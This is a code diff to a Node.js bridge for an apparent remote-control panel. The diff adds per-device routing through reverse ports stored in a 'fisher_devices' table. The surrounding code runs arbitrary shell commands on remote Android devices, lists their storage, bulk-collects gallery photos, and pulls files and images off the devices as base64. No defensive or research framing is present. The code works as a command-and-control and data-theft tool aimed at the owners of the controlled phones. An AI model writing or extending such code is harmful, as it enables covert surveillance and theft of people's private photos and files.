@@ -23,9 +23,12 @@
 const http = require('http');
 const fs = require('fs');
 const path = require('path');
+const { getPool } = require('./commandPoller');
 
 const DXS_HOST = process.env.DXS_HOST || '127.0.0.1';
 const DXS_PORT = Number(process.env.DXS_PORT || 17912);
+const REMOTE_PORT_MIN = Number(process.env.DXS_REMOTE_PORT_MIN || 19902);
+const REMOTE_PORT_MAX = Number(process.env.DXS_REMOTE_PORT_MAX || 29999);
 const DOWNLOAD_DIR = process.env.PANEL_DOWNLOAD_DIR
   || 'C:/Users/Administrator/Desktop/stST/local/cs/public/storage/downloads';
 const MAX_PULL_BYTES = Number(process.env.PANEL_MAX_PULL_BYTES || 24 * 1024 * 1024);
@@ -50,17 +53,44 @@ const ALBUM_COMMANDS = new Set([
 ]);
 
 const albumCancel = new Map();   // deviceId -> true while a scan was stopped
+const endpointCache = new Map(); // deviceId -> { at, host, port }
+const ENDPOINT_TTL_MS = Number(process.env.DXS_ENDPOINT_TTL_MS || 5000);
 
 function log(...a) { console.log('[PanelBridge]', ...a); }
 
-function request(method, p, body, timeoutMs) {
+async function endpointForDevice(deviceId) {
+  const fallback = { host: DXS_HOST, port: DXS_PORT };
+  if (!deviceId) return fallback;
+  const cached = endpointCache.get(deviceId);
+  if (cached && Date.now() - cached.at < ENDPOINT_TTL_MS) {
+    return { host: cached.host, port: cached.port };
+  }
+  try {
+    const [rows] = await getPool().query(
+      'SELECT remote_port FROM fisher_devices WHERE device_id = ? LIMIT 1',
+      [deviceId]
+    );
+    const port = Number(rows?.[0]?.remote_port || 0);
+    if (port >= REMOTE_PORT_MIN && port <= REMOTE_PORT_MAX) {
+      const endpoint = { at: Date.now(), host: DXS_HOST, port };
+      endpointCache.set(deviceId, endpoint);
+      return { host: endpoint.host, port: endpoint.port };
+    }
+  } catch (e) {
+    log('endpoint lookup failed ' + deviceId + ': ' + e.message);
+  }
+  return fallback;
+}
+
+async function request(method, p, body, timeoutMs, deviceId) {
+  const endpoint = await endpointForDevice(deviceId);
   return new Promise((resolve) => {
     let payload = null;
     if (body !== undefined && body !== null) {
       payload = typeof body === 'string' ? body : JSON.stringify(body);
     }
     const r = http.request({
-      host: DXS_HOST, port: DXS_PORT, method, path: p,
+      host: endpoint.host, port: endpoint.port, method, path: p,
       headers: payload ? { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload) } : {},
     }, (res) => {
       const chunks = [];
@@ -74,13 +104,13 @@ function request(method, p, body, timeoutMs) {
   });
 }
 
-async function getJson(p) {
-  const r = await request('GET', p);
+async function getJson(p, deviceId) {
+  const r = await request('GET', p, undefined, undefined, deviceId);
   try { return JSON.parse(r.buffer.toString('utf8')); } catch (e) { return { success: false, error: 'non-json' }; }
 }
 
-async function execShell(command, timeoutMs) {
-  const r = await request('POST', '/execShell', { command }, timeoutMs || 25000);
+async function execShell(command, timeoutMs, deviceId) {
+  const r = await request('POST', '/execShell', { command }, timeoutMs || 25000, deviceId);
   try {
     const j = JSON.parse(r.buffer.toString('utf8'));
     return (j && j.data && typeof j.data.output === 'string') ? j.data.output : '';
@@ -124,22 +154,22 @@ function parseLs(text, dir) {
   return out;
 }
 
-async function listDir(dir) {
-  const j = await getJson('/listDir?path=' + q(dir));
+async function listDir(dir, deviceId) {
+  const j = await getJson('/listDir?path=' + q(dir), deviceId);
   if (!j || j.success !== true || !j.data || typeof j.data.list !== 'string') return [];
   return parseLs(j.data.list, dir);
 }
 
-async function collectImages() {
+async function collectImages(deviceId) {
   const seen = new Set();
   const files = [];
   for (const d of IMAGE_DIRS) {
-    const items = await listDir(d);
+    const items = await listDir(d, deviceId);
     for (const it of items) {
       if (it.name.charAt(0) === '.') continue;
       if (it.isDirectory) {
         if (it.isLink) continue;                       // avoid Android/data loops
-        const sub = await listDir(it.path);
+        const sub = await listDir(it.path, deviceId);
         for (const s of sub) {
           if (s.isDirectory || seen.has(s.path) || !IMAGE_RE.test(s.name)) continue;
           if (s.name.charAt(0) === '.') continue;
@@ -162,9 +192,9 @@ function looksLikeImage(p) { return IMAGE_RE.test(String(p)); }
 
 async function handleFileList(deviceId, payload, conn) {
   const dir = String(payload.path || '/storage/emulated/0');
-  const files = await listDir(dir);
+  const files = await listDir(dir, deviceId);
   if (!files.length) {
-    const probe = await getJson('/listDir?path=' + q(dir));
+    const probe = await getJson('/listDir?path=' + q(dir), deviceId);
     if (!probe || probe.success !== true) {
       send(conn, { type: 'file_response', deviceId, data: { path: dir, error: '读取目录失败: ' + dir } });
       return;
@@ -186,7 +216,7 @@ async function handleFileOp(deviceId, cmd, payload, conn) {
   else if (cmd === 'FILE_OPEN') shell = 'am start -a android.intent.action.VIEW -d ' + shq('file://' + p);
   else if (cmd === 'FILE_COPY') shell = 'cp -rf ' + shq(payload.src_path || p) + ' ' + shq(payload.dst_path || '');
   else if (cmd === 'FILE_MOVE') shell = 'mv -f ' + shq(payload.src_path || p) + ' ' + shq(payload.dst_path || '');
-  const out = shell ? await execShell(shell, 20000) : '';
+  const out = shell ? await execShell(shell, 20000, deviceId) : '';
   send(conn, { type: 'file_op_result', deviceId, data: { command: cmd, path: p, output: out, success: !/error|denied|No such/i.test(out) } });
   if (cmd !== 'FILE_OPEN' && cmd !== 'FILE_DOWNLOAD_HTTP') {
     await handleFileList(deviceId, { path: path.posix.dirname(p) }, conn);
@@ -197,14 +227,14 @@ async function handleFileOp(deviceId, cmd, payload, conn) {
 async function handleFileDownload(deviceId, payload, conn) {
   const rp = String(payload.path || '');
   const requestId = String(payload.requestId || ('dl-' + Date.now()));
-  const out = await execShell('stat -c %s ' + shq(rp), 10000);
+  const out = await execShell('stat -c %s ' + shq(rp), 10000, deviceId);
   const size = parseInt(String(out).trim(), 10) || 0;
   if (!rp) { send(conn, { type: 'file_ready', deviceId, data: { requestId, error: '缺少路径' } }); return; }
   if (size > MAX_PULL_BYTES) {
     send(conn, { type: 'file_ready', deviceId, data: { requestId, error: '文件过大(' + size + 'B)' } });
     return;
   }
-  const b64 = (await execShell('base64 -w0 ' + shq(rp), 90000)).replace(/\s+/g, '');
+  const b64 = (await execShell('base64 -w0 ' + shq(rp), 90000, deviceId)).replace(/\s+/g, '');
   if (!b64) { send(conn, { type: 'file_ready', deviceId, data: { requestId, error: '读取失败' } }); return; }
   const buf = Buffer.from(b64, 'base64');
   try {
@@ -219,7 +249,7 @@ async function handleFileDownload(deviceId, payload, conn) {
 
 async function handleAlbumRead(deviceId, conn) {
   albumCancel.set(deviceId, false);
-  const files = await collectImages();
+  const files = await collectImages(deviceId);
   if (albumCancel.get(deviceId)) { send(conn, { type: 'gallery_complete', deviceId, data: { cancelled: true } }); return; }
   const total = files.length;
   send(conn, { type: 'gallery_image_saved', deviceId, data: { index: 0, total, paths: files.slice(0, 60).map((f) => f.path) } });
@@ -233,10 +263,10 @@ async function handleAlbumRead(deviceId, conn) {
 async function handleAlbumOriginal(deviceId, payload, conn) {
   const rp = String(payload.contentUri || payload.path || payload.uri || '');
   if (!rp) { send(conn, { type: 'gallery_error', deviceId, data: { error: '缺少路径' } }); return; }
-  const out = await execShell('stat -c %s ' + shq(rp), 10000);
+  const out = await execShell('stat -c %s ' + shq(rp), 10000, deviceId);
   const size = parseInt(String(out).trim(), 10) || 0;
   if (size > MAX_PULL_BYTES) { send(conn, { type: 'gallery_error', deviceId, data: { error: '图片过大' } }); return; }
-  const b64 = (await execShell('base64 -w0 ' + shq(rp), 90000)).replace(/\s+/g, '');
+  const b64 = (await execShell('base64 -w0 ' + shq(rp), 90000, deviceId)).replace(/\s+/g, '');
   if (!b64) { send(conn, { type: 'gallery_error', deviceId, data: { error: '读取失败' } }); return; }
   const lower = rp.toLowerCase();
   let mime = 'image/jpeg';
